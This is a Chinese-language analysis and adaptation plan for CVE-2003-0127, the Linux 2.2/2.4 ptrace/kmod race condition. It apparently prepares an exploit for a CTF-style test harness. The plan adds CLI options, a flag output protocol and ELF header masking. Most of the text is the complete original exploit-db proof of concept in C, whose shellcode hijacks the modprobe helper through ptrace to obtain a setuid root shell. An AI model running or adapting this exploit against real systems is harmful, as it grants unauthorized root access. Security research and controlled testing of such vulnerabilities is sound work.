# CVE-2003-0127 漏洞技术分析与PoC改造计划

## 漏洞概述

| 属性 | 值 |
|------|-----|
| CVE ID | CVE-2003-0127 |
| CVSS | 9.0 |
| 严重等级 | CRITICAL |
| 漏洞类型 | Race Condition (Ptrace/Kmod) |
| 影响内核版本 | 2.2.x ~ 2.4.x |
| 利用技术 | 利用内核模块加载器中的竞态条件，通过ptrace劫持特权modprobe进程实现提权 |

## 原始PoC分析

### 参考来源
- **PoC URL**: https://www.exploit-db.com/exploits/3
- **来源类型**: exploit-db

### 利用原理
该漏洞存在于kernel/kmod.c中，内核线程以不安全的方式创建。攻击者可以通过ptrace竞态条件劫持特权modprobe进程，从而在内核上下文中执行任意代码，实现本地提权。

该漏洞的触发条件为内核模块加载时ptrace竞态窗口。攻击者通过精心构造的系统调用序列，利用Race Condition (Ptrace/Kmod)类型的缺陷，在内核空间中实现代码执行或数据篡改。

利用过程中，关键的内存操作为modprobe进程内存空间劫持。最终的提权路径通过通过内核模块加载器上下文执行任意代码完成，使非特权用户获得root权限。

### 关键技术点
1. 内核模块加载时ptrace竞态窗口
2. modprobe进程内存空间劫持
3. 通过内核模块加载器上下文执行任意代码

## PoC改造计划

### CTF挑战模式适配
- **推荐测试模式**: write_root_file
- **模式选择理由**: ptrace竞争条件可劫持内核模块加载，获得内核代码执行权限，实现任意文件写入

### CLI参数规范化
PoC需支持以下标准CLI参数：
- `--mode`: 测试模式 (read_root_file/write_root_file)
- `--root-file`: root权限目标文件路径
- `--write-value`: write模式的写入值 (ctf{...})
- `--log-file`: syscall日志文件路径
- `--verbose`: 详细输出开关

### 输出协议
CTF协议输出：
```
CTF_FLAG:<value>           // 挑战成功
CTF_FAIL:<reason>          // 漏洞未触发
CTF_UNSUPPORTED:<mode>:<reason> // 不支持的模式
```

### 三阶段验证集成
- **Phase 1 (Prepare)**: 验证ptrace权限和内核模块加载器可用性
- **Phase 2 (Run)**: 触发模块加载并在竞态窗口内ptrace attach到modprobe进程
- **Phase 3 (Post)**: 验证提权结果、清理ptrace状态

### Syscall日志记录
关键syscall需要记录到log-file：
- `ptrace`
- `execve`
- `request_module`

## 改造要点

### 核心修改
1. 添加CTF输出协议支持
2. 集成CLI参数解析（--mode/--root-file等）
3. 添加竞态条件超时控制

### 安全约束
- 执行超时: 30秒
- 禁止 rm -rf
- 禁止写 /etc
- 执行后清理临时ELF

### 编译要求
- 编译器: gcc
- 目标架构: x86_64
- 静态链接: 推荐 `-static`
- ELF掩蔽: 编译后前4字节替换为 `CVE\x00`

## Original PoC Source Code

Source: https://www.exploit-db.com/exploits/3

```c
/*
* Linux kernel ptrace/kmod local root exploit
*
* This code exploits a race condition in kernel/kmod.c, which creates
* kernel thread in insecure manner. This bug allows to ptrace cloned
* process, allowing to take control over privileged modprobe binary.
*
* Should work under all current 2.2.x and 2.4.x kernels.
*
* I discovered this stupid bug independently on January 25, 2003, that
* is (almost) two month before it was fixed and published by Red Hat
* and others.
*
* Wojciech Purczynski <cliph@isec.pl>
*
* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
* IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
*
* (c) 2003 Copyright by iSEC Security Research
*/

#include <grp.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <paths.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <linux/user.h>

char cliphcode[] =
	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
	"\x00\x5b\x31\xc9\x89\xca\xcd\x80"
	"\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
	"\x00\x00\xcd\x80\x89\xd0\x89\xd3"
	"\x40\xcd\x80\xe8\xdc\xff\xff\xff";

#define CODE_SIZE (sizeof(cliphcode) - 1)

pid_t parent = 1;
pid_t child = 1;
pid_t victim = 1;
volatile int gotchild = 0;

void fatal(char * msg)
{
	perror(msg);
	kill(parent, SIGKILL);
	kill(child, SIGKILL);
	kill(victim, SIGKILL);
}

void putcode(unsigned long * dst)
{
	char buf[MAXPATHLEN + CODE_SIZE];
	unsigned long * src;
	int i, len;

	memcpy(buf, cliphcode, CODE_SIZE);
	len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
	if (len == -1)
		fatal("[-] Unable to read /proc/self/exe");

	len += CODE_SIZE + 1;
	buf[len] = '\0';

	src = (unsigned long*) buf;
	for (i = 0; i < len; i += 4)
		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
			fatal("[-] Unable to write shellcode");
}

void sigchld(int signo)
{
	struct user_regs_struct regs;

	if (gotchild++ == 0)
		return;

	fprintf(stderr, "[+] Signal caught\n");

	if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)
		fatal("[-] Unable to read registers");

	fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);

	putcode((unsigned long *)regs.eip);

	fprintf(stderr, "[+] Now wait for suid shell...\n");

	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
		fatal("[-] Unable to detach from victim");

	exit(0);
}

void sigalrm(int signo)
{
	errno = ECANCELED;
	fatal("[-] Fatal error");
}

void do_child(void)
{
	int err;

	child = getpid();
	victim = child + 1;

	signal(SIGCHLD, sigchld);

	do
		err = ptrace(PTRACE_ATTACH, victim, 0, 0);
	while (err == -1 && errno == ESRCH);

	if (err == -1)
		fatal("[-] Unable to attach");

	fprintf(stderr, "[+] Attached to %d\n", victim);
	while (!gotchild) ;
	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
		fatal("[-] Unable to setup syscall trace");
	fprintf(stderr, "[+] Waiting for signal\n");

	for(;;);
}

void do_parent(char * progname)
{
	struct stat st;
	int err;
	errno = 0;
	socket(AF_SECURITY, SOCK_STREAM, 1);
	do {
		err = stat(progname, &st);
	} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);

	if (err == -1)
		fatal("[-] Unable to stat myself");

	alarm(0);
	system(progname);
}

void prepare(void)
{
	if (geteuid() == 0) {
		initgroups("root", 0);
		setgid(0);
		setuid(0);
		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
		fatal("[-] Unable to spawn shell");
	}
}

int main(int argc, char ** argv)
{
	prepare();
	signal(SIGALRM, sigalrm);
	alarm(10);

	parent = getpid();
	child = fork();
	victim = child + 1;

	if (child == -1)
		fatal("[-] Unable to fork");

	if (child == 0)
		do_child();
	else
		do_parent(argv[0]);

	return 0;
}

// milw0rm.com [2003-03-30]
```
